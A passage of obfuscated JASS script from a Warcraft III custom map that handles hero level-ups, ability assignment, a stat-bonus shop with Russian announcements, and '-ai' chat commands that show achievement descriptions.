call SetUnitAbilityLevel(Hu,$41305043,2)
set Np=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Np),0,Hu)
call TimerStart(Np,1,false,function zZ)
set Np=null
endif
endif
set Hu=null
endfunction
function zb takes nothing returns nothing
set X2=CreateTrigger()
call TriggerAddAction(X2,function za)
endfunction
function zc takes unit Hu,integer X6,integer X7,integer VD,integer X8,integer PQ,integer X9,integer VE,integer YB,integer VF,integer YC,integer VG,integer YD returns nothing
local integer X5=GetUnitLevel(Hu)
if X7!=$41314433 and X7!=$4131314B then
call UnitAddAbility(Hu,X7)
endif
if GetUnitAbilityLevel(Hu,VD)==0 and GetUnitAbilityLevel(Hu,X8)==0 then
call UnitAddAbility(Hu,VD)
endif
if GetUnitAbilityLevel(Hu,PQ)==0 and GetUnitAbilityLevel(Hu,X9)==0 then
call UnitAddAbility(Hu,PQ)
endif
if GetUnitAbilityLevel(Hu,VE)==0 and GetUnitAbilityLevel(Hu,YB)==0 and X5>=10 then
call UnitAddAbility(Hu,VE)
endif
if GetUnitAbilityLevel(Hu,VF)==0 and GetUnitAbilityLevel(Hu,YC)==0 and X5>=20 then
call UnitAddAbility(Hu,VF)
endif
if GetUnitAbilityLevel(Hu,VG)==0 and GetUnitAbilityLevel(Hu,YD)==0 and X5>=30 then
call UnitAddAbility(Hu,VG)
endif
call TriggerSleepAction(1.5)
if GetUnitAbilityLevel(Hu,$41303853)>=1 and X5>=51 then
if X8!=0 then
call UnitRemoveAbility(Hu,VD)
call UnitAddAbility(Hu,X8)
endif
if X9!=0 then
call UnitRemoveAbility(Hu,PQ)
call UnitAddAbility(Hu,X9)
endif
if YB!=0 then
call UnitRemoveAbility(Hu,VE)
call UnitAddAbility(Hu,YB)
endif
if YC!=0 then
call UnitRemoveAbility(Hu,VF)
call UnitAddAbility(Hu,YC)
endif
if YD!=0 then
call UnitRemoveAbility(Hu,VG)
call UnitAddAbility(Hu,YD)
endif
endif
call SetUnitAbilityLevel(Hu,X6,X5/5)
call SetUnitAbilityLevel(Hu,X7,X5/5)
call SetUnitAbilityLevel(Hu,VD,X5/3)
call SetUnitAbilityLevel(Hu,PQ,X5/3)
call SetUnitAbilityLevel(Hu,VE,(X5-5)/3)
call SetUnitAbilityLevel(Hu,VF,(X5-15)/9)
call SetUnitAbilityLevel(Hu,VG,(X5-25)/5)
endfunction
function zd takes nothing returns nothing
local unit NR=GetTriggerUnit()
local integer X5=GetUnitLevel(NR)
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(NR,UNIT_STATE_MANA,GetUnitState(NR,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Levelup\\LevelupCaster.mdx",NR,"origin"))
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\JudgementTarget.mdx",NR,"origin"))
set Tm[GetConvertedPlayerId(GetOwningPlayer(NR))]=Tm[GetConvertedPlayerId(GetOwningPlayer(NR))]+1
if X5==51 or X5==52 or X5==53 then
if S2[GetConvertedPlayerId(GetOwningPlayer(NR))]==false then
call RemoveUnit(NR)
endif
endif
if X5>=50 then
call SuspendHeroXP(NR,false)
endif
if GetUnitTypeId(NR)==$48303344 then
call zc(NR,$4130504D,0,$41305037,$41305145,$4130505A,$41305157,$41305048,$41305144,$41305047,0,$41305339,0)
elseif GetUnitTypeId(NR)==$48303550 or GetUnitTypeId(NR)==$48303730 then
call zc(NR,$4131364C,0,$41303950,$4130394F,$41304142,0,$4131364F,$41313656,$41313651,0,$41313653,$41313658)
elseif GetUnitTypeId(NR)==$48303147 or GetUnitTypeId(NR)==$48303656 then
if GetUnitAbilityLevel(NR,$41303048)==1 then
call AddSpecialEffectTarget("war3mapImported\\ProjectileOfTheElements.mdx",NR,"chest")
endif
call zc(NR,$41303048,0,$41304342,$41304532,$41304348,$41304533,$4131334C,0,$41304653,0,$4131334D,$4131334E)
elseif GetUnitTypeId(NR)==$48303437 or GetUnitTypeId(NR)==$48303737 then
if GetUnitAbilityLevel(NR,$41305554)==1 then
call AddSpecialEffectTarget("war3mapImported\\Magic_Aura_01.mdx",NR,"origin")
endif
call zc(NR,$41305554,0,$41304C57,0,$41313834,0,$41313839,0,$41313347,0,$41313841,0)
elseif GetUnitTypeId(NR)==$48303534 or GetUnitTypeId(NR)==$48303738 then
call zc(NR,$4131314A,$4131314B,$41313147,$41313159,$41304539,$4130454B,$41313148,$41313157,$41314152,0,$41313155,0)
elseif GetUnitTypeId(NR)==$48303032 or GetUnitTypeId(NR)==$48303655 then
call zc(NR,$41304D4D,$41304D49,$4130304F,0,$41303036,$41304535,$41303456,0,$41304753,$41304754,$4130304A,$41304537)
elseif GetUnitTypeId(NR)==$48303443 or GetUnitTypeId(NR)==$48303654 then
call zc(NR,$4130554B,0,$4130554F,$41305634,$41313955,0,$4130554C,$41305635,$41305550,0,$41305551,$41305636)
elseif GetUnitTypeId(NR)==$48303046 or GetUnitTypeId(NR)==$48303653 then
call zc(NR,$41304843,$41304832,$41303649,$41304541,$4130364B,0,$41304B48,$41304B4B,$41304C32,$41304B5A,$41303842,0)
elseif GetUnitTypeId(NR)==$48303131 or GetUnitTypeId(NR)==$48303652 then
call zc(NR,$41304833,0,$4130454A,0,$41305549,$4130554A,$41303855,$41305544,$41305638,0,$41304236,$41304544)
elseif GetUnitTypeId(NR)==$48303058 or GetUnitTypeId(NR)==$48303651 then
call zc(NR,$41305A55,0,$41303934,0,$41303935,$41304548,$41313348,$4131334A,$41305350,$41305351,$41303330,0)
if GetUnitAbilityLevel(NR,$41304834)==1 then
call AddSpecialEffectTarget("war3mapImported\\Sweep_Fire_Medium.mdx",NR,"weapon")
endif
elseif GetUnitTypeId(NR)==$48303733 or GetUnitTypeId(NR)==$48303034 then
if GetUnitAbilityLevel(NR,$41303454)==0 then
call AddSpecialEffectTarget("war3mapImported\\PSCH_blue_bW.mdx",NR,"weapon")
call AddSpecialEffectTarget("war3mapImported\\Sweep_Black_Frost_Medium.mdx",NR,"weapon")
call AddSpecialEffectTarget("war3mapImported\\HealingWater.MDX",NR,"origin")
endif
call zc(NR,$41313337,0,$41303454,$4130464F,$41313333,$41313334,$41303933,$4130464E,$41313336,0,$4130345A,0)
elseif GetUnitTypeId(NR)==$4830364E then
if GetUnitAbilityLevel(NR,$41304E32)==0 then
call AddSpecialEffectTarget("war3mapImported\\SpellFizzle.MDX",NR,"chest")
call AddSpecialEffectTarget("war3mapImported\\PurpleSphere.mdx",NR,"chest")
endif
call zc(NR,$41313337,0,$41304E32,$41305039,$41313333,$41313334,$4130345A,$41305535,$41305847,0,$4130345A,$4130345A)
elseif GetUnitTypeId(NR)==$48303736 or GetUnitTypeId(NR)==$48303259 then
if GetUnitAbilityLevel(NR,$41303954)==0 then
call AddSpecialEffectTarget("war3mapImported\\Sweep_Black_Frost_Medium.mdx",NR,"weapon")
call AddSpecialEffectTarget("war3mapImported\\GatherSouls.mdx",NR,"origin")
endif
call zc(NR,$41314432,0,$41303954,$41304D58,$41304D50,$41304D57,$41304D51,0,$41303042,0,$41304D53,$41304D59)
elseif GetUnitTypeId(NR)==$45303033 or GetUnitTypeId(NR)==$45303055 or GetUnitTypeId(NR)==$4530304B then
if GetUnitAbilityLevel(NR,$41303039)==0 then
call AddSpecialEffectTarget("war3mapImported\\Soul Bow Enchantment Chilled.mdx",NR,"hand left")
endif
call zc(NR,$41304741,$41304256,$41303039,$41304734,$41305830,$41305831,$41305233,$41303041,$41305A54,0,$4130304E,0)
elseif GetUnitTypeId(NR)==$48303749 or GetUnitTypeId(NR)==$48303356 or GetUnitTypeId(NR)==$48303532 or GetUnitTypeId(NR)==$48303748 or GetUnitTypeId(NR)==$48303744 then
if GetUnitAbilityLevel(NR,$4130524A)==0 then
if GetUnitTypeId(NR)==$48303749 then
call AddSpecialEffectTarget("war3mapImported\\Sweep_Astral_Medium.mdl",NR,"weapon")
call AddSpecialEffectTarget("war3mapImported\\02AuraOfStrengtht.mdx",NR,"origin")
else
call AddSpecialEffectTarget("war3mapImported\\Sweep_Holy_Small.mdx",NR,"weapon")
call AddSpecialEffectTarget("war3mapImported\\RunicAura.mdx",NR,"origin")
endif
endif
call zc(NR,$4130524D,0,$4130524A,$41305251,$4130524B,0,$4130524C,$41305252,$41304657,0,$41303451,$41305250)
elseif GetUnitTypeId(NR)==$48303033 or GetUnitTypeId(NR)==$4830344A then
call zc(NR,$41313031,0,$41303047,$4130454D,$41303045,0,$53303057,$53303058,$41313044,$4130565A,$41303046,0)
elseif GetUnitTypeId(NR)==$48303036 or GetUnitTypeId(NR)==$4830364F then
if GetUnitAbilityLevel(NR,$41305432)==0 then
call AddSpecialEffectTarget("war3mapImported\\Warlock_aura_heroes5.mdx",NR,"origin")
call AddSpecialEffectTarget("war3mapImported\\Sweep_Astral_Medium.mdx",NR,"weapon")
endif
call zc(NR,$41314237,0,$41305432,0,$41313751,0,$53303052,$53303056,$4130344E,$41304658,$4131324F,$41313250)
elseif GetUnitTypeId(NR)==$48303031 or GetUnitTypeId(NR)==$48303650 then
if GetUnitAbilityLevel(NR,$41304C54)==0 then
call AddSpecialEffectTarget("war3mapImported\\Sweep_Blood_Medium.mdx",NR,"weapon")
endif
call zc(NR,$41313232,0,$41304C54,0,$41303032,$41304654,$41303030,$41304652,$41304144,0,$41303146,$41303857)
elseif GetUnitTypeId(NR)==$48303734 or GetUnitTypeId(NR)==$48303353 then
call zc(NR,$41305947,0,$41305939,$41305958,$41305946,$41305957,$4130595A,$41305941,$4130594A,0,$41305951,0)
elseif GetUnitTypeId(NR)==$4830304C or GetUnitTypeId(NR)==$48303659 then
call zc(NR,$41313943,0,$41313942,0,$41303832,0,$53303036,$53303045,$41303833,$41303834,$41304354,$41304430)
elseif GetUnitTypeId(NR)==$4F303054 or GetUnitTypeId(NR)==$4F303032 then
call zc(NR,$41305A31,0,$41313132,$41313145,$41304153,$41304731,$4130385A,0,$4130584C,$4130584D,$5330304C,0)
elseif GetUnitTypeId(NR)==$4F303036 or GetUnitTypeId(NR)==$4F303052 then
call zc(NR,$41313133,0,$41313238,$41313241,$41313056,$4131305A,$41303859,$41304735,$41304435,0,$41313239,0)
elseif GetUnitTypeId(NR)==$4F30304A or GetUnitTypeId(NR)==$4F303053 or GetUnitTypeId(NR)==$4F303055 or GetUnitTypeId(NR)==$4F303034 then
call zc(NR,$41304845,0,$4130574C,0,$41304344,$41304550,$41305458,0,$41304338,$41304551,$41304258,$41305354)
elseif GetUnitTypeId(NR)==$5530304B or GetUnitTypeId(NR)==$55303133 then
if GetUnitAbilityLevel(NR,$41304E56)==0 then
call AddSpecialEffectTarget("war3mapImported\\Sweep_Astral_Medium.mdx",NR,"weapon")
endif
call zc(NR,$41304846,$41314433,$41304E56,$41304E57,$4130435A,$41304555,$41314434,0,$41304359,$41304556,$41313244,0)
elseif GetUnitTypeId(NR)==$45303057 or GetUnitTypeId(NR)==$45303133 then
call zc(NR,$41304341,0,$41303849,0,$41313956,$41313957,$41303852,$41304738,$41313137,$41313138,$41304257,0)
elseif GetUnitTypeId(NR)==$48303735 or GetUnitTypeId(NR)==$4830314B then
call zc(NR,$41305447,0,$41305448,$41305452,$41305449,$41305451,$4130544A,0,$4130544B,0,$4130544C,$41305453)
elseif GetUnitTypeId(NR)==$4F303030 or GetUnitTypeId(NR)==$4F303051 then
if GetUnitAbilityLevel(NR,$41303049)==0 then
call AddSpecialEffectTarget("war3mapImported\\Sweep_Acid_Small.mdx",NR,"weapon")
endif
call zc(NR,$41304847,0,$41303049,0,$41303457,$41303943,$41304459,$41304559,$4130344F,0,$41303053,$4130455A)
elseif GetUnitTypeId(NR)==$48303030 or GetUnitTypeId(NR)==$4830374B then
call zc(NR,$41314355,0,$41314354,0,$41314241,0,$41314242,0,$41314352,0,$41314353,0)
elseif GetUnitTypeId(NR)==$4830354D or GetUnitTypeId(NR)==$4830374F then
call zc(NR,$4131364B,$41305731,$41305732,$41305735,$41305734,$41305746,$4131364E,$41305747,$41313657,0,$41304253,0)
elseif GetUnitTypeId(NR)==$4F303049 then
call zc(NR,$41313430,$41313351,$41313435,0,$41313355,0,$41313353,0,$4131335A,0,$41313442,0)
endif
set NR=null
endfunction
function ze takes nothing returns nothing
local trigger X4=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(X4,EVENT_PLAYER_HERO_LEVEL)
call TriggerAddAction(X4,function zd)
set X4=null
endfunction
function zf takes nothing returns boolean
if not (GetSellingUnit()==Iv) then
return false
endif
if not (IsUnitType(GetBuyingUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function zg takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49305641) then
return false
endif
return true
endfunction
function zh takes nothing returns boolean
if not (TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]==true) then
return false
endif
return true
endfunction
function zi takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49304C55) then
return false
endif
if not (TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]>=1) then
return false
endif
return true
endfunction
function zj takes nothing returns boolean
if not (TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]==true) then
return false
endif
return true
endfunction
function zk takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49304C4F) then
return false
endif
if not (TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]>=1) then
return false
endif
return true
endfunction
function zl takes nothing returns boolean
if not (TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]==true) then
return false
endif
return true
endfunction
function zm takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49304C51) then
return false
endif
if not (TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]>=1) then
return false
endif
return true
endfunction
function zn takes nothing returns boolean
if not (TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]==true) then
return false
endif
return true
endfunction
function zo takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49304C50) then
return false
endif
if not (TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]>=1) then
return false
endif
return true
endfunction
function zp takes nothing returns boolean
if not (TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]==true) then
return false
endif
return true
endfunction
function zq takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49304C54) then
return false
endif
if not (TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]>=1) then
return false
endif
return true
endfunction
function zr takes nothing returns boolean
if not (TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]==true) then
return false
endif
return true
endfunction
function zs takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49304C52) then
return false
endif
if not (TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]>=1) then
return false
endif
return true
endfunction
function zt takes nothing returns boolean
if not (TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]==true) then
return false
endif
return true
endfunction
function zu takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49304C53) then
return false
endif
if not (TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]>=1) then
return false
endif
return true
endfunction
function zv takes nothing returns boolean
if not (TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]==true) then
return false
endif
return true
endfunction
function zw takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49304C57) then
return false
endif
if not (TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]>=1) then
return false
endif
return true
endfunction
function zx takes nothing returns boolean
if not (TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]==true) then
return false
endif
return true
endfunction
function zy takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49304C56) then
return false
endif
if not (TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]>=1) then
return false
endif
return true
endfunction
function zz takes nothing returns nothing
if zg() then
set TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=true
call UnitRemoveAbility(GetBuyingUnit(),$41313833)
call UnitRemoveAbility(GetBuyingUnit(),$41313832)
call UnitRemoveAbility(GetBuyingUnit(),$41305455)
call UnitRemoveAbility(GetBuyingUnit(),$41305456)
call UnitRemoveAbility(GetBuyingUnit(),$41305454)
call UnitRemoveAbility(GetBuyingUnit(),$41305345)
call UnitRemoveAbility(GetBuyingUnit(),$41305A35)
call UnitRemoveAbility(GetBuyingUnit(),$41304F5A)
call UnitRemoveAbility(GetBuyingUnit(),$41305238)
else
endif
if zi() then
if zh() then
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" приобрел Бонус \"Сокрушение\"")
set TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=false
call UnitAddAbility(GetBuyingUnit(),$41304F5A)
call SetUnitAbilityLevel(GetBuyingUnit(),$41304F5A,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41304F5A)
else
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" повысил уровень Бонуса \"Сокрушение\"")
call SetUnitAbilityLevel(GetBuyingUnit(),$41304F5A,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41304F5A)
endif
else
endif
if zk() then
if zj() then
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" приобрел Бонус \"Сила\"")
set TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=false
call UnitAddAbility(GetBuyingUnit(),$41305454)
call SetUnitAbilityLevel(GetBuyingUnit(),$41305454,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41305454)
else
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" повысил уровень Бонуса \"Сила\"")
call SetUnitAbilityLevel(GetBuyingUnit(),$41305454,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41305454)
endif
else
endif
if zm() then
if zl() then
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" приобрел Бонус \"Разум\"")
set TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=false
call UnitAddAbility(GetBuyingUnit(),$41305456)
call SetUnitAbilityLevel(GetBuyingUnit(),$41305456,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41305456)
else
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" повысил уровень Бонуса \"Разум\"")
call SetUnitAbilityLevel(GetBuyingUnit(),$41305456,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41305456)
endif
else
endif
if zo() then
if zn() then
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" приобрел Бонус \"Ловкость\"")
set TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=false
call UnitAddAbility(GetBuyingUnit(),$41305455)
call SetUnitAbilityLevel(GetBuyingUnit(),$41305455,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41305455)
else
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" повысил уровень Бонуса \"Ловкость\"")
call SetUnitAbilityLevel(GetBuyingUnit(),$41305455,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41305455)
endif
else
endif
if zq() then
if zp() then
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" приобрел Бонус \"Регенерация\"")
set TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=false
call UnitAddAbility(GetBuyingUnit(),$41305238)
call SetUnitAbilityLevel(GetBuyingUnit(),$41305238,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41305238)
else
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" повысил уровень Бонуса \"Регенерация\"")
call SetUnitAbilityLevel(GetBuyingUnit(),$41305238,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41305238)
endif
else
endif
if zs() then
if zr() then
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" приобрел Бонус \"Атака\"")
set TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=false
call UnitAddAbility(GetBuyingUnit(),$41313833)
call SetUnitAbilityLevel(GetBuyingUnit(),$41313833,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41313833)
else
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" повысил уровень Бонуса \"Атака\"")
call SetUnitAbilityLevel(GetBuyingUnit(),$41313833,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41313833)
endif
else
endif
if zu() then
if zt() then
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" приобрел Бонус \"Защита\"")
set TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=false
call UnitAddAbility(GetBuyingUnit(),$41305A35)
call SetUnitAbilityLevel(GetBuyingUnit(),$41305A35,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41305A35)
else
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" повысил уровень Бонуса \"Защита\"")
call SetUnitAbilityLevel(GetBuyingUnit(),$41305A35,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41305A35)
endif
else
endif
if zw() then
if zv() then
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" приобрел Бонус \"Аура Атаки\"")
set TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=false
call UnitAddAbility(GetBuyingUnit(),$41313832)
call SetUnitAbilityLevel(GetBuyingUnit(),$41313832,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41313832)
else
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" повысил уровень Бонуса \"Аура Атаки\"")
call SetUnitAbilityLevel(GetBuyingUnit(),$41313832,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41313832)
endif
else
endif
if zy() then
if zx() then
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" приобрел Бонус \"Аура Защиты\"")
set TD[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=false
call UnitAddAbility(GetBuyingUnit(),$41305345)
call SetUnitAbilityLevel(GetBuyingUnit(),$41305345,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41305345)
else
call DisplayTextToForce(GetPlayersAll(),"|c00ab0aee"+GetPlayerName(GetOwningPlayer(GetBuyingUnit()))+" повысил уровень Бонуса \"Аура Защиты\"")
call SetUnitAbilityLevel(GetBuyingUnit(),$41305345,TE[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))])
call UnitMakeAbilityPermanent(GetBuyingUnit(),true,$41305345)
endif
else
endif
endfunction
function z0 takes nothing returns nothing
set YE=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(YE,EVENT_PLAYER_UNIT_SELL_ITEM)
call TriggerAddCondition(YE,Condition(function zf))
call TriggerAddAction(YE,function zz)
endfunction
function z1 takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 42") then
return false
endif
return true
endfunction
function z2 takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 37") then
return false
endif
return true
endfunction
function z3 takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 36") then
return false
endif
return true
endfunction
function z4 takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 35") then
return false
endif
return true
endfunction
function z5 takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 34") then
return false
endif
return true
endfunction
function z6 takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 33") then
return false
endif
return true
endfunction
function z7 takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 32") then
return false
endif
return true
endfunction
function z8 takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 31") then
return false
endif
return true
endfunction
function z9 takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 30") then
return false
endif
return true
endfunction
function BBB takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 29") then
return false
endif
return true
endfunction
function BBC takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 28") then
return false
endif
return true
endfunction
function BBD takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 27") then
return false
endif
return true
endfunction
function BBE takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 24") then
return false
endif
return true
endfunction
function BBF takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 26") then
return false
endif
return true
endfunction
function BBG takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 25") then
return false
endif
return true
endfunction
function BBH takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 23") then
return false
endif
return true
endfunction
function BBI takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 1") then
return false
endif
return true
endfunction
function BBJ takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 2") then
return false
endif
return true
endfunction
function BBK takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 3") then
return false
endif
return true
endfunction
function BBL takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 4") then
return false
endif
return true
endfunction
function BBM takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 5") then
return false
endif
return true
endfunction
function BBN takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 6") then
return false
endif
return true
endfunction
function BBO takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 7") then
return false
endif
return true
endfunction
function BBP takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 8") then
return false
endif
return true
endfunction
function BBQ takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 9") then
return false
endif
return true
endfunction
function BBR takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 10") then
return false
endif
return true
endfunction
function BBS takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 11") then
return false
endif
return true
endfunction
function BBT takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 12") then
return false
endif
return true
endfunction
function BBU takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 13") then
return false
endif
return true
endfunction
function BBV takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 14") then
return false
endif
return true
endfunction
function BBW takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 15") then
return false
endif
return true
endfunction
function BBX takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 16") then
return false
endif
return true
endfunction
function BBY takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 17") then
return false
endif
return true
endfunction
function BBZ takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 18") then
return false
endif
return true
endfunction
function BBa takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 19") then
return false
endif
return true
endfunction
function BBb takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 20") then
return false
endif
return true
endfunction
function BBc takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 21") then
return false
endif
return true
endfunction
function BBd takes nothing returns boolean
if not (GetEventPlayerChatString()=="-ai 22") then
return false
endif
return true
endfunction
function BBe takes nothing returns nothing
if z1() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffПовелитесь песка:|r Убить босса Лен-Кур, чтобы никто из команды не умер от попадания на шипы")
else
endif
if z2() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffСон для слабых:|r Добыть предмет \"Спи, мой хороший\"")
